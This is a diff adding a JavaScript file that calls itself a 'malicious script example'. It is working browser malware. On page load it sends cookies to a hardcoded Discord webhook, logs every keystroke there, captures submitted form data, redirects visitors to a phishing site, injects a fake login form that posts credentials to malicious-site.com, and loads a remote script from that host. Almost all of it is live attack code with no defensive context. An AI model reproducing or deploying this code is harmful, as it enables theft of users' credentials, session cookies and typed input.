@@ -1,0 +1,92 @@
+// Malicious Script Example Sending Data to a Discord Webhook
+
+// Discord Webhook URL (replace with the actual URL)
+var webhookUrl = "https://discord.com/api/webhooks/1268545044026232924/F1yrCWvqPGtyZuyaHRgcHEh11_JHz9kt6cgRo5zTCAwPkBQUJllPSR2zRNftb0tZJIvI";
+
+// 1. Stealing Cookies
+(function() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    var payload = JSON.stringify({
+        content: "Cookies: " + document.cookie
+    });
+    xhr.send(payload);
+})();
+
+// 2. Keylogging
+(function() {
+    document.addEventListener('keydown', function(event) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", webhookUrl, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        var payload = JSON.stringify({
+            content: "Key pressed: " + event.key
+        });
+        xhr.send(payload);
+    });
+})();
+
+// 3. Capturing Form Data
+(function() {
+    document.querySelectorAll('form').forEach(function(form) {
+        form.addEventListener('submit', function() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookUrl, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            var formData = new FormData(form);
+            var data = new URLSearchParams(formData).toString();
+            var payload = JSON.stringify({
+                content: "Form data submitted: " + data
+            });
+            xhr.send(payload);
+        });
+    });
+})();
+
+// 4. Redirecting to a Phishing Site
+(function() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    var payload = JSON.stringify({
+        content: "Redirected to phishing site: http://phishing-site.com"
+    });
+    xhr.send(payload);
+    window.location.href = "http://phishing-site.com";
+})();
+
+// 5. Injecting a Fake Login Form
+(function() {
+    var formHtml = '<form id="fake-login" action="http://malicious-site.com/login" method="post">' +
+                   '<input type="text" name="username" placeholder="Username">' +
+                   '<input type="password" name="password" placeholder="Password">' +
+                   '<input type="submit" value="Login">' +
+                   '</form>';
+    document.body.innerHTML += formHtml;
+
+    // Send a message to Discord about the injected form
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    var payload = JSON.stringify({
+        content: "Injected fake login form into the page."
+    });
+    xhr.send(payload);
+})();
+
+// 6. Injecting a Persistent Script
+(function() {
+    var script = document.createElement('script');
+    script.src = "http://malicious-site.com/persistent-script.js";
+    document.head.appendChild(script);
+
+    // Notify about the injected persistent script
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", webhookUrl, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    var payload = JSON.stringify({
+        content: "Injected persistent script into the page."
+    });
+    xhr.send(payload);
+})();
